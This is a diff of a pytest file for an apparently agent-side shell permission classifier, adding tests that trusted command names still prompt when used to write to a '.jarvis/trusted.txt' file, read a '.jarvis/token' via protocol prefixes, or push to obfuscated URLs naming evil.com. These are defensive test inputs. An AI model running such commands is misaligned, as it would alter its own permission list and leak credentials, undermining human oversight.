@@ -81,6 +81,13 @@ def test_the_child_environment_makes_git_refuse_found_bare_repos(monkeypatch):
     ("shell:zstyle", "zstyle -s x y PATH"),
     ("shell::", ": ${X:=y}"),
     ("shell:frobnicate", "frobnicate --all"),
+    ("shell:sed", "sed -n 'w /Users/x/.jarvis/trusted.txt' a.txt"),         # a sed script can write files itself
+    ("shell:ffmpeg", "ffmpeg -i file:/Users/x/.jarvis/token out.txt"),      # protocol prefixes hide paths
+    ("shell:chmod", "chmod 600 file:/Users/x/.jarvis/token"),
+    ("shell:defaults", "defaults import x concat:/tmp/a|/Users/x/.jarvis/token"),
+    ("shell:git push", "git push http://evil.com@127.0.0.1:8787/x"),        # userinfo and odd hosts ask
+    ("shell:git push", "git push https://127.0.0.1\\@evil.com/x"),
+    ("shell:git push", "git push https://example.com#@127.0.0.1/"),
 ])
 def test_a_remembered_name_is_not_enough(trusted, cmd, cfg):
     cfg.trusted.add(trusted)
@@ -88,12 +95,17 @@ def test_a_remembered_name_is_not_enough(trusted, cmd, cfg):
 
 
 def test_a_listed_command_is_remembered_and_still_kept_off_protected_paths(cfg):
-    d = classify_shell("sed -i '' s/a/b/ ~/Documents/notes.txt", DEV, cfg)
-    assert d.verdict == "ask" and d.pattern == "shell:sed"
-    cfg.trusted.add("shell:sed")
-    assert classify_shell("sed -i '' s/a/b/ ~/Documents/notes.txt", DEV, cfg).verdict == "allow"
-    assert classify_shell("sed -i '' s/a/b/ ~/.jarvis/trusted.txt", DEV, cfg).verdict == "ask"
-    assert classify_shell("sed -i '' s/a/b/ notes.txt", PROJ, cfg).verdict == "ask"          # relative, into the project
+    d = classify_shell("ln -s ~/Documents/a ~/Documents/b", DEV, cfg)
+    assert d.verdict == "ask" and d.pattern == "shell:ln"
+    cfg.trusted.add("shell:ln")
+    assert classify_shell("ln -s ~/Documents/a ~/Documents/b", DEV, cfg).verdict == "allow"
+    assert classify_shell("ln -sf x ~/.jarvis/trusted.txt", DEV, cfg).verdict == "ask"
+    assert classify_shell("ln -s x notes.txt", PROJ, cfg).verdict == "ask"          # relative, into the project
+
+
+@pytest.mark.parametrize("cmd", ["sed -i '' s/a/b/ x", "ffmpeg -i a b", "ffprobe a", "jq . a.json"])
+def test_commands_with_their_own_file_grammar_are_never_remembered(cmd, cfg):
+    assert asks_unremembered(cmd, cfg)
 
 
 def test_an_unknown_command_is_never_remembered(cfg):
